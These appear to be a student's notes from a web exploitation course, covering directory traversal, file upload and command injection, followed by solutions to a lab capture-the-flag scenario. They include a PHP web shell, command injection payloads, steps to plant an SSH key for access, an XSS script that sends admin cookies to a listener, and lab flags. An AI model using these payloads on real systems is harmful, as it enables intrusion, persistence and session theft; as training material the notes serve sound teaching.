
## Web Exploitation ##

Command Examples:

Use POST method to login to website `curl -X POST http://website -d 'username=yourusername&password=yourpassword'` 

Send Cookie settings with data, then pipe results `curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png`

Save to file `curl -o stuff.html http://website/stuff.html`

recursive download two level deep of base dir and save to /tmp `wget -r -l2 -P /tmp ftp://ftpserver/`

Save cookies for website into a file `wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website`

Use the cookie file to grab the page we want `wget --load-cookies cookies.txt -p http://example.com/interesting/article.php`

Server-Side Injection (URL, Upload)
OUTCOME: This section of facilitation introduces the students to the concepts required for skills skill11 and skill12. Students will be able to identify and leverage unsanitized input that is handled in server land as it pertains to URLs, command execution, and file uploads.



### Techniques For Server-Side Injection ###

- While XSS is an injection technique that targets the client browser of a visitor for execution, there are other techniques that target components of the server. In all instances of these latter techniques, the server receives input from the user and executes it in the server-side before returning HTML to the user. If that input is not properly sanitized, it can be used to trigger unintended consequences. Some common examples of server-side injections include directory traversal, command injection, malicious file upload, and SQL injections (SQLI). In this section, we will cover the first three.

#### Directory Traversal: ####

- Directory traversal vulnerabilities exist when an attacker is able to read files on a web server that are outside of the intended scope by the developers. More generally, directory traversal gives an attacker arbitrary read of any file that the web server process has read permission for. This type of vulnerability often occurs in the part of the server that fetches a resource and returns it to the user. This type of vulnerability can manifest in server software such as Apache, IIS, or Nginx, but also in the web applications written in server-side languages as well.

- Imagine a website that allows users to upload and then fetch pictures. Let’s say the pictures are stored in a separate directory isolated from the primary server (such as a file server) and one of the web pages provides a method to return files by name.

    - Say view_image.php receives filenames via a "file" GET parameter such as `view_image.php?file=logo.png`. This page then takes that parameter, and without doing any checks on the value, concatenates it with the path "/data/uploads/" and then returns it to the user. That is, the final path is "/data/uploads/" + "logo.png".

    - A malicious actor could use the lack of sanitization in the file read to access any file on the server that is readable by the server process. For example, on a unix-like system, `view_image.php?file=../../etc/passwd` would return the passwd file back, because `/data/uploads/../../etc/passwd` becomes just `/etc/passwd`. Arbitrary file reads like this can also be used to leak the server-side source code and hunt for further vulnerabilities in other parts of the source code.

          Do not confuse Directory Traversal with Command Injection. Directory traversal involves a script that is READING a file while Command Injection involves EXECUTING a command. However, you COULD execute cat to read a file. A command injection test would detect the latter.


#### DEMO: Directory Traversal ####

1. Demo-Web_Exploit_upload instance navigate to `http://<float IP>/path/pathdemo.php`

2. Page is set to read files from /etc so you can lookup: passwd, profile, networks, etc

3. Traverse to these two files `../../../../var/www/html/robots.txt` and `../../../../usr/share/joe/lang/fr.po
`

#### Malicious File Upload: ####

- Malicious file upload vulnerabilities exist when a user is allowed to upload files to a server in a way that allows an attacker to upload malicious content to the server. An example might be a vulnerability that allows unauthenticated users to host arbitrary malicious files that could leverage the website’s reputation for use in phishing campaigns. However, often it also could allow for direct compromise of the webserver itself, such as in the upload of server-side script files that can later be executed with GET requests.

- Let’s return to the image hosting server in the directory traversal example. Let’s imagine the server is running Apache2 with the PHP module and is configured to serve all files at and within the default server directory of /var/www/html. Additionally, the server is configured with the default settings to execute any file with at .php extension with the PHP interpreter.

    - Instead of storing the files in /data/uploads, upload.php stores the files in `/var/www/html/uploads`. The programmer intended for upload.php to only upload image files, but did not properly validate that the files were images. Consequently, it is possible to upload a malicious PHP named `image.png.php`.

    - Because of how Apache and PHP work together in this situation, the attacker can execute this malicious file by accessing `http://server/uploads/image.png.php`. Attackers can leverage this technique to upload a web shell that allows them to execute arbitrary commands on the server:

        ``` 
        <HTML><BODY>
        <FORM METHOD="GET" NAME="myform" ACTION="">
        <INPUT TYPE="text" NAME="cmd">
        <INPUT TYPE="submit" VALUE="Send">
        </FORM>
        <pre>
        <?php
        if($_GET['cmd']) {
            system($_GET['cmd']);
            }
        ?>
        </pre>
        </BODY></HTML>

        ```


The ability to trick the server to executing arbitrary files based on their extension is especially common in servers like Apache, Nginx or IIS. However, it also is possible in other frameworks as well. If there isn’t sanitization on the file name, an attacker can upload files to arbitrary locations as well.

Imagine we were using the Python framework Flask, which often tracks accessible URIs as routes in a file called views.py. We might be able to overwrite the normal views.py with our own malicious version that adds a URI route for command injection.

DEMO: Malicious File Upload

1. Browse to the Demo-Web_Exploit_XSS instance by navigating to `http://<float IP>`

2. Create malicious file with code above and upload.

3. Navigate to `/uploads` and click your file or call it directly `/uploads/<evil_file>`

4. Conduct enumeration to determine how we could develop a secure shell

5. After enumeration, perform commands such as uploading your ssh key

#### Command Injection ####

Command injection occurs when some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands.

A very basic command injection that is common in home router diagnostic tools is the ping utility. In this case, a web interface allows users to ping an IP address to see if it is online. A vulnerable server might do something as simple as execute `system("ping -c 1 ".$_GET["ip"]);` on the server-side of the website.; An attacker could leverage this to inject `; cat /etc/passwd,` which would make the overall command that is executed `ping -c 1 ; cat /etc/passwd`.

While the basic ping command injection example seems obvious, command injection can occur in places that may not seem inherently obvious. Let’s go back to the image hosting example we’ve been using. Let’s say the developer wants to check to see if the file being uploaded is actually an image file. First it checks if the final extension is either .png, .jpg, or .gif. Then it copies the file to /tmp/imgcheck/filename and runs `file /tmp/imgcheck/filename` to make sure the file utility recognizes the file headers as one of the accepted image types. A malicious user could set the filename of the upload to be `; cat /etc/passwd;#.png`. When the script tries to open the path for writing, it will fail because "/tmp/imgcheck/; cat /etc/passwd;#.png" is not a valid path. However, when it tries to run the file command, it will execute `file /tmp/imgcheck/; cat /etc/passwd;#.png`.

    Trying to read /etc/passwd is a common check for command execution or directory traversal because the file is globally readable. However, another technique is to run a ping to an IP address that the attacker controls and then watch a packet capture on that remote device and watch for a successful ping.


#### Demo: Command Injection ####

1. Demo-Web_Exploit_upload instance navigate to http://<float IP>/cmdinjection/cmdinjectdemo.php

2. Ping a IP to show the page works as designed

3. Showcase a few ways to successfully invoke command injection and perform system enumeration

    ```
    ; whoami
    ; cat /etc/passwd
    ; ls -latr & netstat -rn
    || ifconfig

     ```

4. After enumeration, perform commands such as uploading your ssh key to gain access

#### SSH Key Upload ####

Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.

##### SSH Key Setup #####

1. Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well

`ssh-keygen -t rsa`

2. After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension

`cat ~/.ssh/id_rsa.pub`

    The entire output is your public key, make sure when uploading you copy everything

##### Uploading SSH Key #####

On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there

    The following process is done on target through command injection or malicious upload.

1. Find out what account is running the web sever/commands.

`whoami`

2. Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.

`www-data:x:33:33:www-data:/var/www:/bin/bash`    #/var/www is the home folder for this user and /bin/bash is login shell.

3. Check to see if `.ssh` folder is in the users home directory. If not make it

`ls -la /users/home/directory` #check if .ssh exists

`mkdir /users/home/directory/.ssh` #make .ssh in users home folder if it does not exist

4. Echo ssh key to the authorized_keys file in the users .ssh folder.

`echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys`

5. Verify key has been uploaded successfully.

`cat /users/home/directory/.ssh/authorized_keys`

Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.

SQL able examples -> https://www.programiz.com/sql/select

Web exploitation day 2 -> https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html


### Challenges ###
Donovian Web Exploitation (DWE)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
Jump Box
T1:10.100.28.40

>T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.




2. Through website reconnaissance, what is Romanoff's email address? 
Step1: login to jumpbox: ssh@10.50.33.231 
Step2: create a local to T1 student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:10.100.28.40:80 -NT 
Found following ports: PORT     STATE SERVICE 80/tcp   open  http 4444/tcp open  krb524 
Step 3: Create a dynamic to Jump box 
Step4: run –sV to confirm what services are running on it proxychains nmap -Pn -sV 10.100.28.40 
Step5 : Enumerate the website from ops station  student@lin-ps:~$ proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse
Found above directory Go to all the website I.e http://10.100.28.40/robots.txt There is another directory /net_test. Go to this directory: http://10.100.28.10/net_test Next: http://10.100.28.40/net_test/industry_check.php Next: ticket—we see can go to contract_bids.html


2. Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects. Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload  Step 1: Here we can see a section called system to ping. Lets check if this allows any pings. In system to ping: 8.8.8.8--- this verifies it does allow ping  Step2: Now to see if this allows any command injection to try few commands on on of the three boxes ; pwd ---- to see the current directory ---- var/www/html/net_test ; whoami – who is logged in --- billybob ; cat /etc/passwd --- to see the password of users  view source page

Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories

### Establish a dynamic connection to the jumpbox ###

ssh into your jump box dynamically ->`ssh student@10.50.49.22 -D 9050`

### VIP email address 5 ###

Through website reconnaissance, what is Romanoff's email address?

##### Answer ####

1. use proxychains and nmap to scan for open ports using the given address
    -> `proxychains nmap -Pn --open 10.100.28.40`
2. wget on the http port-> `proxychains wget -r http://10.100.28.40:80`
3. Find out what's running on 4444:
    -> `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> ssh is running on this port so you can ssh to this port 
4. Check the downloaded folder for the robots.txt to see what's allowed to run. 
    -> opening the http://10.100.28.40/net_test/ we see Parent Directory and industry_check.php
    -> Go to the industry_check.php
    -> Click troubleticket. 
    -> open contract_bids.html and your answer will be here 

### Stored Cross Site Scripting (XSS) 8 ###

Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.

##### Answer ####

1. Set your listening port with port of your own on the ops machine -> student@lin-ops:~$ nc -knvl 9696
2. Go to from industry check in VIP email address ->  http://10.100.28.40/TT/ticket.php
3. Edit your cross site scripting script to inject your code like below (use your jump-box's ip address):
    <script>document.location="http://10.50.39.223:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
4. The flag should be displayed from your listening port. 

### Command Injection 1 8 ###

Identify the user that the MI website is running as and relevant information about their user account configuration.

##### Answer ####

1. Go to the industry check page, has forms, that is most vulnerable -> http://10.100.28.40/net_test/industry_check.php
2. find out which of the pages can run commands e.g. ;whoami and look for the output. the second box lists billybob is the user. 
3. Path to test is identified. run 
4. Run `;cat /etc/passwd` to see the password of users 
5. View source page -> to the bottom of the page, you will see you "you found me and the flag .....7H0s83......."

### Basic HTTP Understanding 5 ###

Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

##### Answer ####

proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse

nmap ip 192.168.28.97-100, 100,105,111,120 -pm


2. Create a local tunnel to 10.100.28.40
    -> check if 4444 is an ssh port, `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> `ssh student@10.50.49.22 -L 1222:10.100.28.40:4444`


3. Create a dynamic tunnel to the jumpbox 
    -> `ssh student@localhost -p 1222 -D 9050`
4. From running `proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse`
    -> Found

    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum: 
    |   /robots.txt: Robots file
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'


5. www-data:x:33:33:www-data:/var/www:/bin/bash -> The directory 
6. Find out where the pub directory is -> 


total 52 drwxr-xr-x 7 root root 4096 Apr 19 2022 . drwxrwxr-x 3 root www-data 4096 Apr 19 2022 .. -rw-r--r-- 1 root root 967 Mar 23 2022 Contract_bids.html drwxr-xr-x 2 root root 4096 Dec 13 11:12 TT drwxr-xr-x 2 root root 4096 Apr 19 2022 css -rw-r--r-- 1 root root 263 Mar 23 2022 db_recover.php -rw-r--r-- 1 root root 890 Mar 23 2022 fileUpload.php drwxr-xr-x 2 root root 4096 Apr 19 2022 images -rw-r--r-- 1 root root 2465 Mar 23 2022 index.html drwxr-xr-x 2 root root 4096 Apr 19 2022 net_test -rw-r--r-- 1 root root 34 Mar 23 2022 robots.txt -rw-r--r-- 1 root root 3280 Mar 23 2022 style.css drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads


Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories


my ssh keys: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR


; ls -la /home/billybob/.ssh/

mkdir /home/billybob/.ssh


;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR" >> /home/billybob/.ssh/authorized_keys



 cat /home/billybob/.ssh/authorized_keys
PHPSESSID:"f2lh61den5tp2k8pvglcua4qii"

 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>



 Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

# Create a dynamic channel to spin this server up.... tunnel to 9050

10.100.28.55 

Go through the cyber awareness training.... open firefox to view the website.... 

Directory Traversal
5
Level II Challenge
Training Website

Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.

Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.

There's a form on this site 10.100.28.55 that'll help you answer


Command Injection 2 5

Level II Challenge
Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects.

Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload

Flag for Basic HTTP Understanding -> g91LjrKECe4IPR1hLRsG